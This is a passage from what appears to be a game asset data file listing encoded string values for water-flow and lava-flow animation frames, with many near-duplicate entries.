    "waterFlow38": "0g0ga%%c%;1hyz12x0Thyl0ixgT1yg0iwgS1ykhiww@iyngizw-ix7kxjwi4wl4i4wl3137wgDgh04wgChhg3xhEihg0xhCihJkhxh32hyA1hh02xyz1x12xy11x0",
    "waterFlow39": "0g0ga%%c%;1hyz12x0Thyl0ixgT1yg0iwgS1ykhiww@iyngizw-ix7kxjwi4wl4i4wl3137wgDgh04wgChhg3xhEihg0xhCihJkhxh32hyA1hh02xyz1x12xy11x0",
    "waterFlow40": "0g0ga%c%;%1ihg21i3Nyhg21i0Syhi01i0Ryhg0xgwSyhByxggxhCzhmgxi5BiBgxi5)gBn*x*)gFX9296g0mwy05gwkyy09iwnxyy0iwAxywyiw.1yhg2xw(xihg21iN",
    "waterFlow41": "0g0ga%c%;%1ihg21i3Nyhg21i0Syhi01i0Ryhg0xgwSyhByxggyhCzhmgxi5BiBgxi5)gBn*x*)gFX9296g0mwy05gwkyy09iwnxyy0iwAxywyiw.1yhg2xw(xihg21iN",
    "waterFlow42": "0g0ga%c%;%1ihg21i3Nyhg21i0Syhi01i0Ryhg0xgwSyhByxggyhCzhmgxi5BiBgxi5)gBn*x*)gFX9296g3k0y35gwnyy09iwkxy00iwCxywyiwO1yhw2xw(xihg21iN",
    "waterFlow43": "0g0ga%c%;%1ihg21i3Nyhg21i0Syhi01i0Ryhg0xgwSxhByxggyhCzhmgxi5BiBgxi5)gBn*x*)gFX9296g3k0y35gwnyy09iwkxy00iwCxywyiwO1yhw2xw(xihg21iN",
    "waterFlow44": "0g0ga%c%;%1ghiwxg(xghiwxgz(0hiwxgyR0hgyxgyS0hiy1i2R0h501ii0h63hmi1gB5g5i1gB)i5n*1*)i9XFwFCiym20yBi2k00yFg2n100yg241020g2.x0hiw12N",
    "waterFlow45": "0g0ga%c%;%1ghiwxg(xghiwxgz(0hiwxgyR0hgyxgy0hiy1i20h401ii0h63hmi1gA4g4i@1gA*i4n)1)*i9FwFCiym20yAi2l00yFg2n100yg251020g2.x0hiw12N",
    "waterFlow46": "0g0ga%c%;%1ghiwxg(xghiwxgz(0hiwxgyR0hgyxgyS0hiy1i2R0h501ii0h63hmi1gB5g5i1gB)i5n*1*)i9XFwFCizky0zBi2n00yFg2k10yyg261020g2Ox0h2w12N",
    "waterFlow47": "0g0ga%c%;%1ghiwxg(xghiwxgz(0hiwxgyR0hgyxgyS0hiy1i2R0h501ii0h63hmi1gB5g5i1gB)i5n*1*)i9XFwFCizky0zBi2n00yFg2k10yyg261020g2Ox0h2w12N",
    "waterFlow48": "0g0ga%%;c%1gh2013R1ghgwxiSxglwxgOK0lg0xgO0lg2xgy0lg21j20hi01i20g431oi1gA6g8i1gA.g9p)1>Fg6oA2AFizoy2zCiCn02yAgAo12yyg491020g4",
    "waterFlow49": "0g0ga%%;c%1gh2013R1ghgwxiSxglwxgOK0lg0xgO0lg2xgy0lg21j20hi01i20g431oi1gA6g8i1gA.g9p)1>Fg6oA2AFizoy2zCiCn02yAgAo12yyg491020g4",
    "waterFlow50": "0g0gb%%;c%1gh2013R1ghgwxiSxglwxgOK0lg0xgO0lg2xgy0lg21j20hi01i20g431oi1gA6g8i1gA.g9p)1>Fg6oz2>FgAoy2O!gCo02NAgAp12yyg4610y0g4",
    "waterFlow51": "0g0ga%%;c%1gh2013R1ghgwxiSxglwxgOK0lg0xgO0lg2xgy0lg21j20hi01i20g431oi1gA6g8i1gA.g9p)1>Fg6oz2>FgAoy2OCgCo02NAgAp12yyg4610y0g4",
    "waterFlow52": "0g0ga%%;c%10xO0g41gh3016>1ghg(MjSMgiw(Mg0ig0Mg0ig3MgO0ig31m30hj01j30g461ojhg)5g8j1g)g9p1w@.g5o)3w).j+oO3w+*j*n03wO)g)o13wOOg49",
    "waterFlow53": "0g0ga%%;c%10xO0g41gh3016>1ghg(MjSMgiw(Mg0ig0Mg0ig3MgO0ig31m30hj01j30g461oj1g)5g8j1g)g9p1w@.g5o)3w).j+oO3w+*j*n03wO)g)o13wOOg49",
    "waterFlow54": "0g0ga%%;c%10x30g41gh3016>1ghg(MjSMgiw(Mg0ig0Mg0ig3MgO0ig31m30hj01j30g461oj1g)5g8j1g)g9p1w@.g5o+3w@.g)oO3w*g*o03w)g)p13wOOg45",
    "waterFlow55": "0g0ga%%;c%10x30g41gh3016>1ghg(MjSMgiw(Mg0ig0Mg0ig3MgO0ig31m30hj01j30g461oj1g)5g8j1g)g9p1w@.g5o+3w@.g)oO3w*g*o03w)g)p13wOOg45",
    "waterFlow56": "0g0ga%c%%;12(A2g?412My0hC1gM00171ij00w4x2jg0wi2jg0xgQ2jg21gyJ0jg01ky0hg01420g2209i0g27g8ihgDDg9kh(GDgBkA2(BgGpy2(QCgp02(RDg?5",
    "waterFlow57": "0g0ga%c%%;12(A2g?412My0hC1gM00171ij00w4x2jg0wi2jg0xgQ2jg21gyJ0jg01ky0hg01420g2209i0g27g8ihgDDg9kh(GDgBkA2(BgGpy2(QCgp02(RDg?5",
    "waterFlow58": "0g0ga%c%%;12(y2gA512My0gB1gM00171ij00w6x2jg0wiS2jg0xg2jg21gyJ0jg01myR0hg01620g2209i0g27g8ihgDDg9nh(GDgAmy2(GDgm22(Dgm12(Cg6",
    "waterFlow59": "0g0ga%c%%;12(y2gA512My0gB1gM00171ij00w6x2jg0wiS2jg0xg2jg21gyJ0jg01myR0hg01620g2209i0g27g8ihgDDg9mh(GDgAmy2(GDgm22(Dgm12(Cg6",
    "waterFlow60": "0g0ga%c%%;12(QAg?412(A2g?412My0hC1gM00171ij00w4x2jg0wi2jg0xgQ2jg21gyJ0jg01ky0hg01420g2209i0g27g8ihgDDg9kh(GDgBkA2(BgGpy2(QCgp",
    "waterFlow61": "0g0ga%%c%;12(?Ag@412(A2g@412My0hD1gM00151ij00w4x2jg0wiUK2jg1xgQ2jg21gyJ0jg01ky0hg01420g2209i0g25g8ihgBBg9kUh(VBgCkA2(UCgVpy2(QDgp",
    "waterFlow62": "0g0ga%%c%;01wMk+651wh1m751Bh0n5B0054T500g3Sl10g>K10lO115h005h0V0531011090148Vkk9>VwQkmh1wQk@11w)kP",
    "waterFlow63": "0g0ga%%c%;01wMk+651wh1m751Bh0n5B0054T500g3Sl10g>K10lO115h005h0V053101100148Vkk9>VwQkmh1wQk@11w)kP",
    "waterFlow64": "0g0gb%%c%;0i(Aygi1i(Ayh21i(E0h?21gMy011gM001D1ij0004Sx8jg00i[8jg00gX2jg20gAJ2jg20nA2hg00480h0ig6o0g2og!i0g78g!iR1(ygCiyg(QAgo",
    "waterFlow65": "0g0gb%%c%;0i(Aygi1i(Ayh21i(E0h?21gMy011gM001D1ij0004Sx8jg00i[8jg00gX2jg20gAJ2jg20nA2hg00480h0ig6o0g2og!i0g78g!iR1(ygCiyg(QAgo",
    "waterFlow66": "0g0gb%%c%;1x(?kwA2x(?kw42x(khw42wNh02@2wN002o2xz0005i4zw00xK4zw00w?1zw10wl1zw10El1yw00540y0xw7A0w1Awqx0w84wqx2(]hwnxhw(ohwGx",
    "waterFlow67": "0g0gb%%c%;1x(?kwA2x(?kw42x(khw42wNh02@2wN002o2xz0005i4zw00xK4zw00w?1zw10wl1zw10El1yw00540y0xw7A0w1Awqx0w84wqx2(]hwnxhw(ohwGx",
    "waterFlow68": "0g0gb%%c%;0iN40iVgygN60igxgN60h?wxgN8yhwxiM0yxSxiMyyx4SxgjyyyC1EjiyygEjiyyiwjiwyi6wjiwyk6whiyyCEyhygiBoiiwoiagyiAEiagKxNX0i5g",
    "waterFlow69": "0g0gb%%c%;0iN40iVgygN60igxgN60h?wxgN8yhwxiM0yxSxiMyyx4SxgjyyyC1EjiyygEjiyyiwjiwyi6wjiwyk6whiyyCEyhygiBoyiwoiagyiAEiagKxNX0i5g",
    "waterFlow70": "0g0gb%%c%;0iNQ4inwgN7inxgN7iDxgN70i@DxiM0yxxiMyyx8xgjyyyAR1Djiyyg]Djiyyiwjiwyi4wjiwyo4whiyyADyhygiBnyiwniagyiEDiagSxN0i5g",
    "waterFlow71": "0g0gb%%c%;0iNQ4inwgN7inxgN7iDxgN70i@DxiM0yxxiMyyx8xgjyyyAR1Djiyyg]Djiyyiwjiwyi4wjiwyo4whiyyADyhygiBnyiwniagyiEDiagSxN0i5g",
    "waterFlow72": "0g0gc%%;c%ZZ1hzSQM)TMzSkM)hMz?kM)hMzShOkhMz?hOIQjOzQhj4jMzhhj4j*yhhhS>.NMhh).NMkhM(NMkhMPgNOkh-plOM)MppkOh)M@.hOh)M[(hzgkM[*",
    "waterFlow73": "0g0gc%%;c%ZZ1hzSQM)TMzSkM)hMz?kM)hMzShOkhMz?hOIQjMzQhj4jMzhhj4j*yhhhS>.NMhh).NMkhM(NMkhMPgNOkh-plOM)MppkOh)M@.hOh)M[(hzgkM[*",
    "waterFlow74": "0g0gc%%;c%ZZ1hzSQM)QMx[QM)hMxSQM)hMxSQOkhMx?hOQjMzQhj4jMzhhj4j*yhhhS>,NMhh),NMkhM(NMkhM[gNOkh.nlOM)MnnkOh)M@,hOh)M](hzgkM]*",
    "waterFlow75": "0g0gc%%;c%ZZ1hzSQM)QMx[QM)hMxSQM)hMxSQOkhMx?hOQjMzQhj4jMzhhj4j*yhhhS>,NMhh),NMkhM(NMkhM[gNOkh.nlOM)MnnkOh)M@,hOh)M](hzgkM]*",
    "waterFlow76": "0g0gc%%;c%ZZ1hzklM,ThzUVM*MzUlM0*hMzlMK*hMzUhO8lhMzhOIVjMzVhj?jMzhhj?j,yhhhU.NMhh*5.NMlhM)NMlhMkNOlh-pnOM*MpplOh*M.1hOh*M)",
    "waterFlow77": "0g0gc%%;c%ZZ1hzklM,ThzUVM*MzUlM0*hMzlMK*hMzUhO8lhMzhOIVjMzVhj?jMzhhj?j,yhhhU.NMhh*5.NMlhM)NMlhMkNOlh-pnOM*MpplOh*M.1hOh*M)",
    "waterFlow78": "0g0gc%%;c%ZZ1hzklM,ThzUVM*VMxVM0*hMxUVMK*hMxUVO9lhMxhOVjMzVhj?jMzhhj?j,yhhhU-NMhh*5-NMlhM)NMlhMkNOlh.onOM*MoolOh*M-1hOh*M)",
    "waterFlow79": "0g0gc%%;c%ZZ1hzklM,ThzUVM*VMxVM0*hMxUVMK*hMxUVO9lhMxhOVjMzVhj?jMzhhj?j,yhhhU-NMhh*5-NMlhM)NMlhMkNOlh.onOM*MoolOh*M-1hOh*M)",
    "waterFlow80": "0g0gc%c%%;ZZ1i)h?TC[1hQiRTw?hQiiTRxQQliT9RkTQBiTRTTQyiQ7yhTQyhQyhT)yhQyhMOhhQVyk]>hiTyxAS>TiTiC2S>TihTD2@>TihTCn>QihpmnQTRhwn1iQhRhw[",
    "waterFlow81": "0g0gd%c%%;ZZs1i)h?TC[1hQiRTw?hQiiTRxQQliT9RkTQBiTRTTQyiQ7yhTQyhQyhT)yhQyhMOhhQVyk]>hiTyxAS>TiTiC2S>TihTD2@>TihTCn>QihpmnQTRhwn1iQhRh$[",
    "waterFlow82": "0g0gd%c%%;ZZ1i)h?TC[1hQiRTE?hQiiTRxQ)FiT0RhT)BiTRhT)FhQ7yhT)BhQyhT)yhQyhMOhhQVykP>hiTyxAS>TiTiC2S>TihTD2@>TihTCn>QihqmnQTRhwn1iQhRhw[",
    "waterFlow83": "0g0gc%c%%;ZZ1i)h?TC[1hQiRTw?hQiiTRxQ)EiT0RhT)BiTRhT)EhQ7yhT)BhQyhT)yhQyhMOhhQVyk]>hiTyxAS>TiTiC2S>TihTD2@>TihTCn>QihpmnQTRhwn1iQhRhw[",
    "waterFlow84": "0g0gc%c%%;ZZ1iOhNhw)1ih+MD)1hOiNMw+hOiiMNxOOmiM9NjMOCiMNMMOyiO4yhMOyhOyhMyhO]yhVhhOyj-*hiMyxz(*MiMiD2(*MihMA2,*MihMDk*OihpnkOMNhwk",
    "waterFlow85": "0g0gc%c%%;ZZ1iOhNhw)1ih+MD)1hOiNMw+hOiiMNxOOmiM9NjMOCiMNMMOyiO4yhMOyhOyhMyhO]yhVhhOyj-*hiMyxz(*MiMiD2(*MihMA2,*MihMDk*OihpnkOMNhwk",
    "waterFlow86": "0g0gc%c%%;ZZ1iOhNhw)1ih+MD)1hOiNMw+hOiiMNxOEiM0NhMCiMNhMEhO4yhMChOyhMyhO]yhVhhOyj-*hiMyxz(*MiMiD2(*MihMA2,*MihMDk*OihpnkOMNhwk",
    "waterFlow87": "0g0gc%c%%;ZZ1iOhNhw)1ih+MD)1hOiNMw+hOiiMNxOEiM0NhMCiMNhMEhO4yhMChOyhMyhO]yhVhhOyj-*hiMyxz(*MiMiD2(*MihMA2,*MihMDk*OihpnkOMNhwk",
    "waterFlow88": "0g0ga%%c%;1i)h?Ti1l)h?TR1h)h@T@hQhmT*kQlmT*hkQlmT0?hkQVlT?TQQVlTVTQQlhQBVTQOlhQhTOhhQh@)TlQhVUS)TlQT5S)MmQT1[)QlQT1p)QlTop",
    "waterFlow89": "0g0ga%%c%;1i)h?Ti1l)h?TR1h)h@T@hQhmT*kQlmT*hkQlmT0?hkQVlT?TQQVlTVTQQlhQBVTQOlhQhTOThQh@)TlQhVUS)TlQT5S)MmQT1[)QlQT1p)QlTop",
    "waterFlow90": "0g0ga%%c%;1i)h?Ti1l)h?TR1h)h@T@hQhmT*kQlmT*QQllT8?kQQVlTGTTQQVlQTQQlhQTQOlhQBhTOhhQh@)TlQhVUS)TlQT5S)MmQT1[)QlQT1p)QlTop",
    "waterFlow91": "0g0ga%%c%;1i)h?Ti1l)h?TR1h)h@T@hQhmT*kQlmT*QQllT8?kQQVlTGTTQQVlQTQQlhQTQOlhQBhTOhhQh@)TlQhVUS)TlQT5S)MmQT1[)QlQT1p)QlTop",
    "waterFlow92": "0g0ga%;%c%1i)QlTmi1n)h?Tn1l)h?T[1h)h]T]hQhoT*kQloT*hkQloT0?hkQVlTJ?TQQVlTBVTQQlhQVTQOlhQhTOhhQh])TlQhVUS)TlQT5S)MoQT1P)QlQT",
    "waterFlow93": "0g0ga%;%c%1i)QlTmi1n)h?Tn1l)h?T[1h)h]T]hQhoT*kQloT*hkQloT0?hkQVlTJ?TQQVlTBVTQQlhQVTQOlhQhTOhhQh])TlQhVUS)TlQT5S)MoQT1P)QlQT",
    "waterFlow94": "0g0ga%;%c%1i)QlTmi1n)h?Tn1l)h?T[1h)h]T]hQhoT*kQloT*QQllT6?kQQVlTTTQQVlQTQQlhQBTQOlhQhTOhhQh])TlQhVUS)TlQT5S)MoQT1P)QlQT",
    "waterFlow95": "0g0ga%;%c%1i)QlTmi1n)h?Tn1l)h?T[1h)h]T]hQhoT*kQloT*QQllT6?kQQVlTTTQQVlQTQQlhQBTQOlhQhTOhhQh])TlQhVUS)TlQT5S)MoQT1P)QlQT",
    "waterFlow96": "0g0gac%%%;1iOMkOMl1kOMkOmllh*Mnlph*M.hh)M.FhOhkM.hOhkMhjOhkMS*hjOhMQ*MjOhMMOOhpOMOOphMhMOphMhO.pMh(O.pMM1NOkMM",
    "waterFlow97": "0g0gac%%%;1iOMkOMl1kOMkOmllh*Mnlph*M.hh)M.FhOhkM.hOhkMhjOhkMS*hjOhMQ*MjOhMMOOhpOMOOphMhMOphMhO.pMh(O.pMM1NOkMM",
    "waterFlow98": "0g0gac%%%;1iOMkOMl1kOMkOmllh*Mnlph*M.hh)M.FhOhkM.hOhkMhjOplM[.hjOhMR.MOOhMPMOOphOMOOphMhMOphMhO.pMh(O.pMM1NOkMM",
    "waterFlow99": "0g0gac%%%;1iOMkOMl1kOMkOmllh*Mnlph*M.hh)M.FhOhkM.hOhkMhjOplM[.hjOhMR.MOOhMPMOOphOMOOphMhMOphMhO.pMh(O.pMM1NOkMM",
    "waterFlow100": "0g0gac%%%;1zyTlxx1jyxlyxn1lyxlyonnRhDxpnmRhDxChRhBxC+hyhlxChyhlx[hiyhlxDhiyhxVDxiyhxxyyhmyxyyChxhxymhxh@yCmxhwyCmxx",
    "waterFlow101": "0g0gac%%%;1zyTlxx1jyxlyxn1lyxlyonnRhDxpnmRhDxChRhBxC+hyhlxChyhlx[hiyhlxDhiyhxVDxiyhxxyyhmyxyymhxhxymhxh@yCmxhwyCmxx",
    "waterFlow102": "0g0gac%%%;1zyTlxx1jyxlyxn1lyxlyonnRhDxpnmRhDxChRhBxC+hyhlxChyhlx[hiymnxChiyhxCxyyhxxyymhyxyymhxhxymhxh@yCmxhwyCmxx",
    "waterFlow103": "0g0gac%%%;1zyTlxx1jyxlyxn1lyxlyonnRhDxpnmRhDxChRhBxC+hyhlxChyhlx[hiymnxChiyhxCxyyhxxyymhyxyymhxhxymhxh@yCmxhwyCmxx",
    "waterFlow104": "0g0ga%%c%;1zywghxgMzywjhxgTlywjixggyxjimg0wliog1ywBx9wShygBx6x(hygkxoB02ygkxogiyh4x3Ahiyhx0Ahiyg5x1jxiyg0xhliyyg1xhgiyyl1xhh2xyBghhh",
    "waterFlow105": "0g0ga%%c%;1zywghxgMzywjhxgTlywjixggyxjimg0wliog1ywBx9wShygBx6x(hygkxoB02ygkxogiyh4x3Ahiyhx0Ahiyg5x1jxiyg0xhliyyg1xhgiyyl1xhh2xyBghhh",
    "waterFlow106": "0g0ga%%c%;1zywghxgMzywjhxgTlywjixggyxjimg0wlyog1ywBx9wShygBx6x(hygkxoB02ygkxohiyh3x8BhiyhVx5Bxiyg5x0gxiyg0yhgiyyg1xhgiyyl1xhh2xyBghhh",
    "waterFlow107": "0g0ga%%c%;1zywghxgMzywjhxgTlywjixggyxjimg0wliog1ywBx9wShygBx6x(hygkxoB02ygkxohiyh3x8BhiyhVx5Bxiyg5x0gxiyg0yhgiyyg1xhgiyyl1xhh2xyBghhh",
    "waterFlow108": "0g0ga%%c%;1ihjwyyy2khgwyiwRkhgAyiwzhgAxiwwhiAxCw0gzxEw2hgji9gyhwji6iSyhwBiEj01hwBiEwxhy5i4lyxhy)i0lyxhw3i2Aixhw0iyzxhhw2iywxhhz2iyy",
    "waterFlow109": "0g0ga%%c%;1ihjwyyy2khgwyiwRkhgAyiwzhgAxiwwhiAxCw0gzxEw2hgji9gyhwji6iSyhwBiEj01hwBiEwxhy5i4lyxhy)i0lyxhw3i2Aixhw0iyzxhhw2iywxhhz2iyy",
    "waterFlow110": "0g0ga%%c%;1ihjwyyy2khgwyiwRkhgAyiwzhgAxiwwhiAxCw0gzxEw2hgji9gyhwji6iSyhwBiEj01hwBiEyxhy4i8jyxhyOi3jixhw3i0wixhw0hywxhhw2iywxhhz2iyy",
    "waterFlow111": "0g0ga%%c%;1ihjwyyy2khgwyiwRkhgAyiwzhgAxiwwhiAxCw0gzxEw2hgji9gyhwji6iSyhwBiEj01hwBiEyxhy4i8jyxhyOi3jixhw3i0wixhw0hywxhhw2iywxhhz2iyy",
    "waterFlow112": "0g0ga%%;c%1hhi3jOOTjhiQOOOTkhiQOMO>khl(OM)3khg(MO)Ohk)MNOU>j)M*j>hkkONj2>hkgONj?>hkNO*iSMMkNj()MMkRj(o)MMkBj)pOMMkwjONMMhkUjO*Thhl3jO)",
    "waterFlow113": "0g0ga%%;c%1hhi3jOOTjhiQOOOTkhiQOMO>khl(OM)3khg(MO)Ohk)MNOU>j)M*j>hkkONj2>hkgONj?>hkNO*iSMMkNj()MMkRj(o)MMkBj)pOMMkwjONMMhkUjO*Thhl3jO)",
    "waterFlow114": "0g0g8%%;4J^cX^X^|c]{;__N{MaN{xN{^{,JI^JUaJ{SJ{XJ|c",
    "waterFlow115": "0g0g8%%;4J^cX^X^|c]{;__N{MaN{xN{^{,JI^JUaJ{SJ{XJ|c",
    "waterFlow116": "0g0ga%%;c%1hhi)kQSMhhl)kQQ1khl0QQQ1ghl0QTQ4ghi>QTS)ghj>TQSAQhgST?Qw4kSTRkB4hggQ?k*4hgjQ?k24hg?QRl3TTg?k>STTg5k>oSTTgkSpQTTgkQ?TThgwkQR",
    "waterFlow117": "0g0ga%%;c%1hhi)kQSMhhl)kQQ1khl0QQQ1ghl0QTQ4ghi>QTS)ghj>TQSAQhgST?Qw4kSTRkB4hggQ?k*4hgjQ?k24hg?QRl3TTg?k>STTg5k>oSTTgkSpQTTgkQ?TThgwkQR",
    "waterFlow118": "0g0g8%%;4J^wJ|A4|2PA4|2]g^]K_pwR]pS{{oUR]yP{R]&P{8R]]eo]iKkJiKdJi]yi]Sz",
    "waterFlow119": "0g0g8%%;4J^wJ|A4|2PA4|2]g^]K_pwR]pS{{oUR]yP{R]&P{8R]]eo]iKkJiKdJi]yi]Sz",
    "waterFlow120": "0g0ga%%c%;1h1i)g1iThhigh4hhjwg101hjS0100hS011wgh4000Aghi41000hk0170?SKk01Qg]Sgk41Qg]Tgkn0Qk31gg?0Qo51gk?0421giRg041giJg0p0hgig0o",
    "waterFlow121": "0g0ga%%c%;1h1i)ghiThhigh4hhjwg101hjS0100hS011wgh4000Aghi41000hk0170?SKk01Qg]Sgk41Qg]Tgkn0Qk31gg?0Qo51gk?0421giRg041giJg0p0hgig0o",
    "waterFlow122": "0g0ga%%c%;1hgi)h1lThhigh4hhjwg101hjS0100hS011wgh4000Aghi41000hk0170?SKk01Qg]Sgk41Qg]Tgkn0Qk31gg?0Qo51gk?04411i?g7411iJg4j011ig0l",
    "waterFlow123": "0g0ga%%c%;1hgi)h1lThhigh4hhjwg101hjS0100hS011wgh4000Aghi41000hk0170?SKk01Qg]Sgk41Qg]Tgkn0Qk31gg?0Qo51gk?04411i?g7411iJg4j011ig0l",
    "waterFlow124": "0g0ga%%c%;011i)g0l1h1ig1ihhigh7hhmwg101hm0100h011wgh7000Dghi7100R0hn0140n01Gggn71Gggnk0Gn61gg0Gj51gn0721gig071giJg0p",
    "waterFlow125": "0g0ga%%c%;011i)g0l1h1ig1ihhigh7hhmwg101hm0100h011wgh7000Dghi7100R0hn0140n01Gggn71Gggnk0Gn61gg0Gj51gn0721gig071giJg0p",
    "waterFlow126": "0g0ga%%c%;0hgi)g0j1hgih1nhhigh6hhlwg101hlK0100hK011wgh6000Cghi6100R0hm0140Km01gKgm61ggmk0m51gg0j71gm06611ig4611iJg6l",
    "waterFlow127": "0g0ga%%c%;0hgi)g0j1hgih1nhhigh6hhlwg101hlK0100hK011wgh6000Cghi6100R0hm0140Km01gKgm61ggmk0m51gg0j71gm06611ig4611iJg6l",
    
    lavaFlow:"0g0g100W",
    "lavaFlow0": "0g0gx(ZgY0YwYWZ>WYSZYZ2YYHH>WYYZHWHWZWiYOWHyZWWHBZ0gcw4k0J(1|cNe;3410c{(k;28({d*V(0wgd(cwTQ0BgC1hKR4Mkcw(>0gc@74w0cw0gp58(T(04g5z8MS8w;d[nwwgww00SQ3ckB)wg34hikcwt+08w?cqcgShXcg45n80n*n|k",
    "lavaFlow1": "0g0gx(ZgY0YwYWZ>WYSZYZ2YYHH>WYYZHWHWZWiYOWHyZWWHBZ0gcw4k0J(1|cNe;3410c{(k;28({d*V(0wgd(cwTQ0BgC1hKR4Mkcw(>0gc@74w0cw0gp58(T(04g5z8MS8w;d[nwwgww00SQ3ckB)wg34hikcwt+08w?cqcgShXcg45n80n*n|k",
    "lavaFlow2": "0g0gx(ZgY0YwYWZ>WYSZYZ2YYHH>WYYZHWHWZWiYOWHyZWWHBZ0gcw4k0J(1|cNe;3410c{(k;28({d*V(0wgd(cwTQ0BgC1hKR4Mkcw(>0gc@74w0cw0gp58(T(04g5z8MS8w;d[nwwgww00SQ3ckB)wg34hikcwt+08w?cqcgShXcg45n80n*n|k",
    "lavaFlow3": "0g0gx(ZgY0YwYWZ>WYSZYZ2YYHH>WYYZHWHWZWiYOWHyZWWHBZ0gcw4k0J(1|cNe;3410c{(k;28({d*V(0wgd(cwTQ0BgC1hKR4Mkcw(>0gc@74w0cw0gp58(T(04g5z8MS8w;d[nwwgww00SQ3ckB)wg34hikcwt+08w?cqcgShXcg45n80n*n|k",
    "lavaFlow4": "0g0gtwYZWW0YWZ(ZgYWyZYH>WHW2YYZYSZHHHZiYWHZ0QN4EOk/8BNxsO0NX14k8SmIP*^8^E018k1/8By80018^8%fUKw010eTwNw0;4JfoD(hRR02oci0O+Kh0606107]q3",
    "lavaFlow5": "0g0gtwYZWW0YWZ(ZgYWyZYH>WHW2YYZYSZHHHZiYWHZ0QN4EOk/8BNxsO0NX14k8SmIP*^8^E018k1/8By80018^8%fUKw010eTwNw0;4JfoD(hRR02oci0O+Kh0606107]q3",
    "lavaFlow6": "0g0gtwYZWW0YWZ(ZgYWyZYH>WHW2YYZYSZHHHZiYWHZ0QN4EOk/8BNxsO0NX14k8SmIP*^8^E018k1/8By80018^8%fUKw010eTwNw0;4JfoD(hRR02oci0O+Kh0606107]q3",
    "lavaFlow7": "0g0gtwYZWW0YWZ(ZgYWyZYH>WHW2YYZYSZHHHZiYWHZ0QN4EOk/8BNxsO0NX14k8SmIP*^8^E018k1/8By80018^8%fUKw010eTwNw0;4JfoD(hRR02oci0O+Kh0606107]q3",
    "lavaFlow8": "0g0gp(ZYHHwYWZWSZWWgYHY2YZiYY0YH>WyZHWOW0QNgF9yUV/{V(d20BLqqr)zR!oRhF.0Tnyt0h7.BAU$g4lc2Ro/AQ16Aw4(0>sy1/VU0KA-AmK}aRh3i2gN%20d",
    "lavaFlow9": "0g0gp(ZYHHwYWZWSZWWgYHY2YZiYY0YH>WyZHWOW0QNgF9yUV/{V(d20BLqqr)zR!oRhF.0Tnyt0h7.BAU$g4lc2Ro/AQ16Aw4(0>sy1/VU0KA-AmK}aRh3i2gN%20d",
    "lavaFlow10": "0g0gp(ZYHHwYWZWSZWWgYHY2YZiYY0YH>WyZHWOW0QNgF9yUV/{V(d20BLqqr)zR!oRhF.0Tnyt0h7.BAU$g4lc2Ro/AQ16Aw4(0>sy1/VU0KA-AmK}aRh3i2gN%20d",
    "lavaFlow11": "0g0gp(ZYHHwYWZWSZWWgYHY2YZiYY0YH>WyZHWOW0QNgF9yUV/{V(d20BLqqr)zR!oRhF.0Tnyt0h7.BAU$g4lc2Ro/AQ16Aw4(0>sy1/VU0KA-AmK}aRh3i2gN%20d",
    "lavaFlow12": "0g0gnWWyZwYgYW(ZZSZYHZHZWHYWiY0YOW2Y>W0QhX9{Ot9N1!a)Oh?9nM8!aXK@^y4K0qz4gXTM8]Uc8><4dMC>sQMIOpsTd4Xw)-p{@pwM>8gM%wjc*",
    "lavaFlow13": "0g0gnWWyZwYgYW(ZZSZYHZHZWHYWiY0YOW2Y>W0QhX9{Ot9N1!a)Oh?9nM8!aXK@^y4K0qz4gXTM8]Uc8><4dMC>sQMIOpsTd4Xw)-p{@pwM>8gM%wjc*",
    "lavaFlow14": "0g0gnWWyZwYgYW(ZZSZYHZHZWHYWiY0YOW2Y>W0QhX9{Ot9N1!a)Oh?9nM8!aXK@^y4K0qz4gXTM8]Uc8><4dMC>sQMIOpsTd4Xw)-p{@pwM>8gM%wjc*",
    "lavaFlow15": "0g0gnWWyZwYgYW(ZZSZYHZHZWHYWiY0YOW2Y>W0QhX9{Ot9N1!a)Oh?9nM8!aXK@^y4K0qz4gXTM8]Uc8><4dMC>sQMIOpsTd4Xw)-p{@pwM>8gM%wjc*",
    "lavaFlow16": "0g0gpZZ(ZHWwYWWWWgYYSZOWHiY>WyZ0Y2YYHYH>W0Rx(4x8N-QAK2R8Bx{J-QPi080nM?!Slw0y?6({8XDMIQP0r8kiM&x9+*Ua$C5RiQ1BJB!R!OFuy/{k@x9z",
    "lavaFlow17": "0g0gpZZ(ZHWwYWWWWgYYSZOWHiY>WyZ0Y2YYHYH>W0Rx(4x8N-QAK2R8Bx{J-QPi080nM?!Slw0y?6({8XDMIQP0r8kiM&x9+*Ua$C5RiQ1BJB!R!OFuy/{k@x9z",
    "lavaFlow18": "0g0gpZZ(ZHWwYWWWWgYYSZOWHiY>WyZ0Y2YYHYH>W0Rx(4x8N-QAK2R8Bx{J-QPi080nM?!Slw0y?6({8XDMIQP0r8kiM&x9+*Ua$C5RiQ1BJB!R!OFuy/{k@x9z",
    "lavaFlow19": "0g0gpZZ(ZHWwYWWWWgYYSZOWHiY>WyZ0Y2YYHYH>W0Rx(4x8N-QAK2R8Bx{J-QPi080nM?!Slw0y?6({8XDMIQP0r8kiM&x9+*Ua$C5RiQ1BJB!R!OFuy/{k@x9z",
    "lavaFlow20": "0g0grSZ0YWiYOWYWZyZY(ZHwYHWgYWZHWZH>WW2YYZ0Rx/iERUE[6M3M^3kKAk|Rl/P_^bQF_U+F!l4$4B5Io!%6F2&cONO3FI5EFDK8kE00E!5$cc3u{|}",
    "lavaFlow21": "0g0grSZ0YWiYOWYWZyZY(ZHwYHWgYWZHWZH>WW2YYZ0Rx/iERUE[6M3M^3kKAk|Rl/P_^bQF_U+F!l4$4B5Io!%6F2&cONO3FI5EFDK8kE00E!5$cc3u{|}",
    "lavaFlow22": "0g0grSZ0YWiYOWYWZyZY(ZHwYHWgYWZHWZH>WW2YYZ0Rx/iERUE[6M3M^3kKAk|Rl/P_^bQF_U+F!l4$4B5Io!%6F2&cONO3FI5EFDK8kE00E!5$cc3u{|}",
    "lavaFlow23": "0g0grSZ0YWiYOWYWZyZY(ZHwYHWgYWZHWZH>WW2YYZ0Rx/iERUE[6M3M^3kKAk|Rl/P_^bQF_U+F!l4$4B5Io!%6F2&cONO3FI5EFDK8kE00E!5$cc3u{|}",
    "lavaFlow24": "0g0gv0YwY(ZZOWHWZHHHWYHZyZSZWWgYYYW>WiYW>WZZHY0QNkpT80M_xRyxyj7a|NgXwo8RRrNc2}kRp^6gP_x01XF(Xg%gIyT(X(IDh5083({&Xx8}8x82l4-O0lmDT",
